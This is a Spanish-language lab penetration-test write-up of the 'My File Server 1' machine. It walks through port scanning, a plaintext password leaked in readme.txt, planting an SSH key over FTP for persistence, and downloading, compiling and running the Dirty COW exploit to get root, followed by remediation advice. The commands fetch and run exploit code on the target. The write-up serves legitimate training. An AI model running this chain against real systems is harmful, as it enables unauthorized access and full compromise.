# 01_RESUMEN_EJECUTIVO

> Objetivo del Engagement: Evaluación de seguridad sobre la máquina vulnerable "My File Server 1" (IP: 192.168.56.104), la cual simula un servidor corporativo de archivos expuesto en un entorno de laboratorio.

> Causa Raíz: No fue una sola falla aislada, sino la combinación de debilidades encadenables: exposición de información sensible por HTTP, reutilización de credenciales válidas, controles insuficientes en accesos remotos y un kernel desactualizado.

> Impacto (Severidad Crítica): El ejercicio confirmó una cadena de compromiso completa, desde la exposición inicial de servicios hasta la obtención de privilegios de superusuario (root). En un entorno real, esto permitiría acceso no autorizado a documentos, alteración de información y uso del sistema como pivote hacia la red interna.

// ALCANCE_Y_METODOLOGÍA

  • > Marco de Trabajo: PTES (Penetration Testing Execution Standard) y OWASP Testing Guide.
  • > Herramientas Desplegadas: netdiscover, Nmap, enum4linux, smbclient, Nikto, SSH, gcc, wget.
  • > Restricciones: Entorno académico controlado (Red NAT). No se realizaron ataques de denegación de servicio (DoS).

# 02_BITÁCORA_DE_EXPLOTACIÓN_(KILL_CHAIN)

> Despliegue los módulos para inspeccionar la secuencia táctica de compromiso del servidor.

OBJETIVOIdentificar vectores
HERRAMIENTASNmap / Nikto / Enum4linux

> Contexto: Tras localizar el host (192.168.56.104) con netdiscover, se ejecutó un escaneo activo de puertos para identificar servicios, versiones y el SO.

> Hallazgos Críticos: Se detectaron múltiples servicios expuestos, incluyendo FTP (21, 2121), SSH (22), HTTP (80), RPC/NFS (111, 2049) y SMB (445).

> Enumeración Web: Utilizando Nikto sobre el puerto HTTP, se descubrió la ruta /readme.txt accesible sin ningún tipo de autenticación. Al revisar este archivo en el navegador, se filtró una contraseña vital en texto plano: rootroot1.

Recon Commands Executed
# Escaneo sigiloso y de versiones con Nmap
Kali > nmap -sS -sV -O -p- 192.168.56.104

# Extracción de credenciales expuestas en la web
Browser > http://192.168.56.104/readme.txt
Output > My Password is rootroot1
OBJETIVOGanar Shell interactiva
VULNERABILIDADReutilización de claves

> Contexto: Sabiendo que el usuario `smbuser` fue descubierto durante la enumeración de SMB, se probó la contraseña `rootroot1` encontrada previamente contra los servicios de acceso remoto.

> Estableciendo Persistencia: Para garantizar un acceso seguro y continuo por SSH, se generó un par de claves criptográficas locales (ed25519). Usando la sesión FTP comprometida de smbuser, se creó el directorio .ssh en el servidor y se subió la clave pública nombrándola authorized_keys.

> Resultado: Conexión exitosa por SSH sin requerir contraseña interactiva, logrando ejecución de comandos remotos (RCE) como un usuario de bajos privilegios.

Exploitation Commands
# Generación de llaves y subida por FTP comprometido
Kali > sudo ssh-keygen -t ed25519
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /root/.ssh/id_ed25519.pub authorized_keys

# Acceso inicial exitoso
Kali > ssh smbuser@192.168.56.104
[smbuser@fileserver ~]$
OBJETIVOCompromiso Total (Root)
EXPLOITCVE-2016-5195

> Identificación de Brecha: Al tener una shell, el primer paso táctico fue verificar la versión del sistema operativo. El comando uname -r arrojó la versión 3.10.0-229.el7.x86_64. Esta versión es famosamente vulnerable a "Dirty COW", una falla de condición de carrera en el mecanismo de copy-on-write del kernel de Linux.

> Explotación: Se descargó el código fuente del exploit (cowroot.c) desde Exploit-DB hacia el servidor víctima usando `wget`. Posteriormente, se compiló nativamente usando `gcc` invocando la librería de subprocesos (`-pthread`).

> Impacto Final: Al ejecutar el binario resultante, el exploit sobrescribió `/usr/bin/passwd` y forzó la apertura de una shell con privilegios máximos. El comando id confirmó el contexto de uid=0(root), permitiendo la lectura de la bandera final en /root/proof.txt.

PrivEsc Commands Executed
# Verificación del kernel vulnerable
smbuser$ uname -r
Output > 3.10.0-229.el7.x86_64

# Compilación y ejecución de Dirty COW
smbuser$ wget https://www.exploit-db.com/download/40616-0 -O cowroot.c
smbuser$ gcc cowroot.c -o cowroot -pthread
smbuser$ ./cowroot

# Verificación de identidad
root# id
Output > uid=0(root) gid=1000(smbuser) groups=0(root)...

// ANÁLISIS_POST_MORTEM_Y_REMEDIACIÓN

La evaluación de My File Server 1 demuestra de manera irrefutable que las defensas actuales son insuficientes. Las principales recomendaciones estratégicas de contención son:

1. Inmediata: Retirar el archivo readme.txt expuesto en la red y rotar todas las credenciales de los usuarios comprometidos de forma urgente.
2. A Corto Plazo: Endurecer (Hardening) los servicios SSH mediante la desactivación de inicio de sesión por contraseña, forzando solo autenticación por llaves públicas aprobadas.
3. A Mediano Plazo: Aplicar un programa de parchado integral para el sistema operativo, actualizando el Kernel para erradicar la vulnerabilidad estructural (Dirty COW) e integrando herramientas de monitoreo como EDR.
